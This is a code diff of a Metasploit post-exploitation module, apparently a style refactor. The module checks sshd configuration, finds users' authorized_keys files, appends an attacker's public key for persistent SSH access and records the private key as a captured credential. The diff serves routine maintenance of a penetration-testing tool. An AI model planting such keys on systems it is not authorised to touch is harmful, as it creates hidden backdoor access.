@@ -1,10 +1,11 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-#require 'msf/core'
-#require 'msf/core/post/file'
+# require 'msf/core'
+# require 'msf/core/post/file'
 require 'sshkey'
 
 class MetasploitModule < Msf::Post
@@ -48,12 +49,12 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if session.type == "meterpreter"
-      sep = session.fs.file.separator
-    else
-      # Guess, but it's probably right
-      sep = "/"
-    end
+    sep = if session.type == "meterpreter"
+            session.fs.file.separator
+          else
+            # Guess, but it's probably right
+            "/"
+          end
     print_status('Checking SSH Permissions')
     sshd_config = read_file(datastore['SSHD_CONFIG'])
     /^PubkeyAuthentication[\s]+(?<pub_key>yes|no)/ =~ sshd_config
@@ -66,9 +67,7 @@ class MetasploitModule < Msf::Post
     if auth_key_file
       auth_key_file = auth_key_file.gsub('%h', '')
       auth_key_file = auth_key_file.gsub('%%', '%')
-      if auth_key_file.start_with? '/'
-        auth_key_file = auth_key_file[1..-1]
-      end
+      auth_key_file = auth_key_file[1..-1] if auth_key_file.start_with? '/'
     else
       auth_key_file = '.ssh/authorized_keys'
     end
@@ -80,11 +79,11 @@ class MetasploitModule < Msf::Post
       print_status("Finding #{auth_key_folder} directories")
       paths = enum_user_directories.map { |d| d + "/#{auth_key_folder}" }
     else
-      if datastore['USERNAME'] == 'root'
-        paths = ["/#{datastore['USERNAME']}/#{auth_key_folder}"]
-      else
-        paths = ["/home/#{datastore['USERNAME']}/#{auth_key_folder}"]
-      end
+      paths = if datastore['USERNAME'] == 'root'
+                ["/#{datastore['USERNAME']}/#{auth_key_folder}"]
+              else
+                ["/home/#{datastore['USERNAME']}/#{auth_key_folder}"]
+              end
       vprint_status("Added User SSH Path: #{paths.first}")
     end
 
@@ -121,22 +120,21 @@ class MetasploitModule < Msf::Post
       print_status("Adding key to #{authorized_keys}")
       append_file(authorized_keys, "\n#{our_pub_key}")
       print_good("Key Added")
-      if datastore['PUBKEY'].nil?
-        path_array = path.split(sep)
-        path_array.pop
-        user = path_array.pop
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: refname,
-          private_type: :ssh_key,
-          private_data: key.private_key.to_s,
-          username: user,
-          workspace_id: myworkspace_id
-        }
+      next unless datastore['PUBKEY'].nil?
+      path_array = path.split(sep)
+      path_array.pop
+      user = path_array.pop
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        private_type: :ssh_key,
+        private_data: key.private_key.to_s,
+        username: user,
+        workspace_id: myworkspace_id
+      }
 
-        create_credential(credential_data)
-      end
+      create_credential(credential_data)
     end
   end
 end
